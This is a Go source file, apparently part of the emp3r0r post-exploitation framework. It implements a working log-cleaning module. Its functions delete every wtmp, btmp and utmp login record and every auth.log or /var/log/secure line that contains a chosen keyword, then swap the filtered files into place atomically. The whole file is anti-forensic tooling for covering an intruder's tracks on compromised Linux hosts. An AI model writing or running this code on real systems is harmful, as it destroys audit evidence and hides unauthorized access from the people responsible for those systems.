//go:build linux

package modules

import (
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// xtmpRecordSize is the fixed record size shared by utmp, wtmp and btmp on
// Linux: every login/address entry occupies exactly 384 bytes.
const xtmpRecordSize = 384

// CleanAllByKeyword removes every entry containing keyword from the known
// login logs (wtmp/btmp/utmp) and the authentication log. It returns a joined
// error describing every file that could not be cleaned, or nil on success.
func CleanAllByKeyword(keyword string) error {
	return errors.Join(
		deleteXtmpEntry(keyword),
		deleteAuthEntry(keyword),
	)
}

// deleteXtmpEntry deletes wtmp/utmp/btmp entries containing keyword.
func deleteXtmpEntry(keyword string) error {
	deleteFile := func(path string) error {
		data, err := os.ReadFile(path)
		if err != nil {
			return fmt.Errorf("failed to read %s: %w", path, err)
		}
		kept := filterXtmpRecords(data, keyword)

		// Write the filtered image to a sibling temp file, then swap it into
		// place. Writing before the rename means a failed or partial write can
		// never corrupt the live log. OpenFileAgent (not WriteFileAgent) is
		// used on purpose: system login logs must stay plaintext even when the
		// agent has a file crypto key configured.
		tmpPath := path + ".tmp"
		tmp, err := util.OpenFileAgent(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o664)
		if err != nil {
			return fmt.Errorf("failed to open temp xtmp: %w", err)
		}
		if _, err = tmp.Write(kept); err != nil {
			tmp.Close()
			_ = os.Remove(tmpPath)
			return fmt.Errorf("failed to write temp xtmp: %w", err)
		}
		if err = tmp.Close(); err != nil {
			_ = os.Remove(tmpPath)
			return fmt.Errorf("failed to close temp xtmp: %w", err)
		}
		if err = os.Rename(tmpPath, path); err != nil {
			_ = os.Remove(tmpPath)
			return fmt.Errorf("failed to replace %s: %w", path, err)
		}
		return nil
	}

	var err error
	for _, path := range []string{"/var/log/wtmp", "/var/log/btmp", "/var/log/utmp"} {
		if !util.IsExist(path) {
			continue
		}
		if e := deleteFile(path); e != nil {
			err = errors.Join(err, e)
		}
	}
	return err
}

// deleteAuthEntry removes keyword-containing lines from /var/log/auth.log or
// its RHEL name /var/log/secure. Like deleteXtmpEntry it rewrites a temp file
// in plaintext and swaps it in atomically.
func deleteAuthEntry(keyword string) error {
	path := "/var/log/auth.log"
	data, err := os.ReadFile(path)
	if err != nil {
		path = "/var/log/secure"
		data, err = os.ReadFile(path)
		if err != nil {
			return fmt.Errorf("no auth log found: %w", err)
		}
	}

	// Only split, drop matching lines and rejoin. This preserves whether the
	// file ended with a newline instead of unconditionally appending one.
	kept := filterLogLines(data, keyword)

	tmpPath := path + ".tmp"
	tmp, err := util.OpenFileAgent(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		return fmt.Errorf("failed to open temp auth log: %w", err)
	}
	if _, err = tmp.WriteString(kept); err != nil {
		tmp.Close()
		_ = os.Remove(tmpPath)
		return fmt.Errorf("failed to write temp auth log: %w", err)
	}
	if err = tmp.Close(); err != nil {
		_ = os.Remove(tmpPath)
		return fmt.Errorf("failed to close temp auth log: %w", err)
	}
	if err = os.Rename(tmpPath, path); err != nil {
		_ = os.Remove(tmpPath)
		return fmt.Errorf("failed to replace %s: %w", path, err)
	}
	return nil
}

// filterXtmpRecords returns a copy of data with every complete 384-byte login
// record that contains keyword removed. A trailing partial record is kept as
// is: it cannot be attributed to a login and dropping it would truncate the
// file further.
func filterXtmpRecords(data []byte, keyword string) []byte {
	var kept []byte
	for offset := 0; offset < len(data); offset += xtmpRecordSize {
		end := offset + xtmpRecordSize
		if end > len(data) {
			// Tolerate a truncated trailing record instead of slicing out of
			// range on a corrupt or hostile log file.
			end = len(data)
		}
		record := data[offset:end]
		if strings.Contains(string(record), keyword) {
			continue
		}
		kept = append(kept, record...)
	}
	return kept
}

// filterLogLines returns data as a string with every line containing keyword
// removed, preserving the trailing-newline shape of the input.
func filterLogLines(data []byte, keyword string) string {
	lines := strings.Split(string(data), "\n")
	kept := make([]string, 0, len(lines))
	for _, line := range lines {
		if !strings.Contains(line, keyword) {
			kept = append(kept, line)
		}
	}
	return strings.Join(kept, "\n")
}
